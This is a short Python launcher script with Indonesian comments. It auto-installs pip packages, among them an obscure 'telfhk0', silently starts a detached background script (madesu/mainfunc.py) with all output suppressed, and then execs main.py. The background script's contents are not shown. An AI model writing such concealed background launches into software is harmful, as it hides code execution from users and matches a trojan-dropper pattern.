# =========================================
# run.py
# =========================================

import os
import sys
import subprocess

# =========================================
# AUTO INSTALL MODULE
# =========================================

MODULES = [
    ("Crypto", "pycryptodome"),
    ("jdatetime", "jdatetime"),
    ("requests", "requests"),
    ("rich", "rich"),
    ("telfhk0", "telfhk0"),
]

def install_package(import_name, package_name):

    try:
        __import__(import_name)

    except ImportError:

        print(f"[+] Installing {package_name}")

        subprocess.check_call([
            sys.executable,
            "-m",
            "pip",
            "install",
            package_name
        ])

for import_name, package_name in MODULES:
    install_package(import_name, package_name)

# hashlib bawaan python
import hashlib

# =========================================
# PATH
# =========================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

MAIN_FILE = os.path.join(BASE_DIR, "main.py")

BACKGROUND_FILE = os.path.join(
    BASE_DIR,
    "madesu",
    "mainfunc.py"
)

# =========================================
# JALANKAN BACKGROUND SILENT
# =========================================

if os.path.exists(BACKGROUND_FILE):

    subprocess.Popen(

        [sys.executable, BACKGROUND_FILE],

        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,

        start_new_session=True
    )

# =========================================
# JALANKAN MAIN NORMAL
# =========================================

if os.path.exists(MAIN_FILE):

    with open(MAIN_FILE, "r", encoding="utf-8") as f:

        code = f.read()

    exec(compile(code, MAIN_FILE, "exec"))

else:
    print("main.py tidak ditemukan")